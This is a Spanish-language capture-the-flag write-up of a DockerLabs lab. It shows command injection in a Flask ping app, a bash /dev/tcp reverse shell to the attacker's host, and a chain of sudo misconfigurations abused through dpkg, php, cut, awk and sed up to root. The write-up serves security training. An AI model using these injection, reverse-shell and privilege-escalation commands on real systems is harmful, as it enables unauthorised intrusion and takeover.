---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Facil
VectorInicial: Command Injection (Flask ping app - puerto 5000)
ServicioInicial: HTTP (Werkzeug Python 3.12.3)
PuertoInicial: 5000
Credenciales: No requeridas (acceso vía RCE)
Usuarios:
- freddy
- bobby
- gladys
- chocolatito
- theboss
- root
Privesc: Cadena de sudo mal configurado + GTFOBins (dpkg → php → cut → awk → sed)
Tecnicas:
- Command Injection
- Reverse Shell
- Privilege Escalation (Sudo misconfiguration)
- User Pivoting
- File Read (cut)
Herramientas:
- gomap
- curl
- penelope
- bash
- sudo
- GTFOBins
Fecha: 2026-04-17
---
<img width="921" height="519" alt="Pasted image 20260417092632" src="https://github.com/user-attachments/assets/bada7e63-3d3a-48b6-9067-fb77a00e67a1" />

Vamos a empezar con el reconocimiento del servidor para ver sus puertos y servicios.

```bash
 gomap -s -p - $TARGET 

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 172.17.0.2 (65535 ports, CONNECT scan)

PORT    STATE  SERVICE         VERSION
80      open   http            Apache 2.4.58 (Ubuntu)
443     open   https           Apache 2.4.58 (Ubuntu)
5000    open   http            Werkzeug/3.0.1 Python/3.12.3

Host Exposure Summary
- 172.17.0.2 | open ports: 3 | critical: none | exposure: low

✓ Completed scan in 283ms | hosts: 1 | open ports: 3
```

Podemos observar que tenemos varios puertos abiertos y los 3 son para web.
- `80` servicio para web
- `443` servicio weeb seguro
- `5000` servicio web o aplicación web mediante **Python**

Veamos que nos encontramos en la web.

Tanto en el puerto `80` como en el `443` solo nos encontramos con la pagina por defecto de `Apache` para *Ubuntu*.

Pero en el puerto `5000` nos encontramos con una aplicación para realizar un `ping` así que empezaremos por ver el tipo de resultados que nos arroja.

<img width="457" height="221" alt="Pasted image 20260417093525" src="https://github.com/user-attachments/assets/cd97faf8-e6b0-4717-9fa7-4463e612c005" />

Al realizar un `ping` a `localhost` este nos arroja un resultado.

<img width="455" height="404" alt="Pasted image 20260417093833" src="https://github.com/user-attachments/assets/429ee21b-fdc1-4dee-b153-bbf2c18d03f2" />

Esto nos da a pensar varias cosas, la primera el tipo de `ping` que realiza.
- `ping -c 4 $HOST`
	- Este ping solo realiza 4 peticiones a un host determinado por una variable.

Por lo que es posible que podamos concatenar comandos a esta petición.

```bash
ping -c 4 $HOST && whoai
```

Y el resultado es.

```bash
PING localhost (::1) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.014 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.019 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.020 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.019 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3058ms
rtt min/avg/max/mdev = 0.014/0.018/0.020/0.002 ms
freddy
```

Perfecto, el comando a funcionado y nos ha indicado el usuario `freddy`.

Probemos otro comando.

```bash
PING localhost (::1) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.078 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.020 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.019 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.020 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3051ms
rtt min/avg/max/mdev = 0.019/0.034/0.078/0.025 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
freddy:x:1001:1001::/home/freddy:/bin/bash
bobby:x:1002:1002::/home/bobby:/bin/bash
gladys:x:1003:1003::/home/gladys:/bin/bash
chocolatito:x:1004:1004::/home/chocolatito:/bin/bash
theboss:x:1005:1005::/home/theboss:/bin/bash
```

Pues parece que no tenemos limitaciones a la hora de insertar comandos desde esta aplicación para hacer `ping`, pero aunque tengamos estos datos no podemos conectarnos por **ssh** así que teniendo la posibilidad de ejecutar comandos intentaremos un `revshell`.

```bash
localhost && /bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
```

Pero el resultado nos da que pensar puesto que no es el esperado pero si revelador.

```bash
Command 'ping -c 4 localhost && /bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' returned non-zero exit status 2.
```

Parece que no le ha gustado como esta indicado el comando, así que probaremos con varias formas, empezamos con las `'` para ver si podemos encerrar el comando, pero sin éxito, así que procederemos a realizar una codificación en `base64` ya que es muy posible que la interpretación no escape bien algún carácter.

```bash
localhost && L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQ0NCAwPiYx
```

Pero tampoco funciono, pero me acorde de otra manera de hacerlo.

```bash
localhost && bash -c '/bin/sh -i >& /dev/tcp/172.17.0.1/4444 0>&1'
```

Usamos `bash -c` para que sea el propio interprete del sistema el que lance el comando y no la aplicación web, de esta manera obtenemos acceso a la maquina.

```bash
 penelope -p 4444   
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.11.11 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 83184ac2b6d4~172.17.0.2-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
freddy@83184ac2b6d4:~$ 
```

Ahora es cuando toca una escalada de privilegios, veamos que encontramos.

```bash
freddy@83184ac2b6d4:~$ sudo -l
Matching Defaults entries for freddy on 83184ac2b6d4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User freddy may run the following commands on 83184ac2b6d4:
    (bobby) NOPASSWD: /usr/bin/dpkg
freddy@83184ac2b6d4:~$ 
```

Parece que va a ser rápido puesto que tenemos permisos para usar `dpkg` como **bobby**, veamos que dice [GTFOBins](https://gtfobins.org/gtfobins/dpkg/#shell) al respecto.

```bash
sudo -u bobby /usr/bin/dpkg -l
```

Con este comando se nos mostrara unza sección interactiva y por eso pulsaremos la combinación de teclas `SHIFT + 1` para indicar `!` .

En el `prompt` que se nos muestra escribiremos `/bin/bash` para obtener una `shell` como `bobby`, ahora veamos que nos aporta este usuario.

```bash
bobby@83184ac2b6d4:/home/freddy$ sudo -l
Matching Defaults entries for bobby on 83184ac2b6d4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bobby may run the following commands on 83184ac2b6d4:
    (gladys) NOPASSWD: /usr/bin/php
bobby@83184ac2b6d4:/home/freddy$ 
```

Ahora es el turno de `gladys`, pues nada otro `pivoting` de usuario.

```bash
bobby@83184ac2b6d4:/home/freddy$ sudo -u gladys php -r 'system("/bin/bash -i");'
gladys@83184ac2b6d4:/home/freddy$ 
Matching Defaults entries for gladys on 83184ac2b6d4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User gladys may run the following commands on 83184ac2b6d4:
    (chocolatito) NOPASSWD: /usr/bin/cut
gladys@83184ac2b6d4:/home/freddy$ 
```

Bueno otro mas, ahora `chocolatito`.

Pero para cambiar a este usuario tenemos que usar `cut` por consiguiente necesitamos un fichero, esto nos da a pensar que hay un fichero con contraseñas, así que tendremos que buscarlo.

```bash
gladys@83184ac2b6d4:/home/freddy$ find / -user chocolatito 2>/dev/null
/opt/chocolatitocontraseña.txt
/home/chocolatito
gladys@83184ac2b6d4:/home/freddy$
```

Parece que hemos encontrado lo que buscamos, ahora solo queda usar `cut` para que hay en `chocolatitocontraseña.txt`.

```bash
gladys@83184ac2b6d4:/home/freddy$ sudo -u chocolatito /usr/bin/cut -d "" -f1 "/opt/chocolatitocontraseña.txt"
chocolatitopassword
gladys@83184ac2b6d4:/home/freddy$ 
```

Ahora ya nos conectamos como `chocolatito` y veamos que nos encontramos.

```bash
gladys@83184ac2b6d4:/home/freddy$ su chocolatito
Password: 
chocolatito@83184ac2b6d4:/home/freddy$ cd
chocolatito@83184ac2b6d4:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
chocolatito@83184ac2b6d4:~$ sudo -l
Matching Defaults entries for chocolatito on 83184ac2b6d4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User chocolatito may run the following commands on 83184ac2b6d4:
    (theboss) NOPASSWD: /usr/bin/awk
chocolatito@83184ac2b6d4:~$ gladys@83184ac2b6d4:/home/freddy$ su chocolatito
Password: 
chocolatito@83184ac2b6d4:/home/freddy$ cd
chocolatito@83184ac2b6d4:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
chocolatito@83184ac2b6d4:~$ sudo -l
Matching Defaults entries for chocolatito on 83184ac2b6d4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User chocolatito may run the following commands on 83184ac2b6d4:
    (theboss) NOPASSWD: /usr/bin/awk
chocolatito@83184ac2b6d4:~$ 
```

Ahora toca pasar a `theboss`, veamos que sigue.

```bash
chocolatito@83184ac2b6d4:~$ sudo -u theboss awk 'BEGIN {system("/bin/bash")}'
theboss@83184ac2b6d4:/home/chocolatito$ cd
theboss@83184ac2b6d4:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
theboss@83184ac2b6d4:~$ sudo -l
Matching Defaults entries for theboss on 83184ac2b6d4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User theboss may run the following commands on 83184ac2b6d4:
    (root) NOPASSWD: /usr/bin/sed
theboss@83184ac2b6d4:~$ 
```

Parece que estamos llegando al final, ahora para ser **root** solo tenemos que escalar con `sed`.

```bash
theboss@83184ac2b6d4:~$ sudo -u root sed -n '1e exec /bin/bash 1>&0' /etc/hosts
root@83184ac2b6d4:/home/theboss# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
root@83184ac2b6d4:/home/theboss# cd
root@83184ac2b6d4:~# ls
root@83184ac2b6d4:~# 
```

Y con este paso final ya somo **root**

### Conclusión

Este laboratorio aunque esta marcado como `Medio` en dificultad no termina de llegar ser del todo, si que es cierto que la primera parte se puede complicar por tener que meter un comando en medio de otro pero en definitiva es muy repetitivo a la hora de las escaladas es todo muy repetitivo, sin cambios y algo largo.
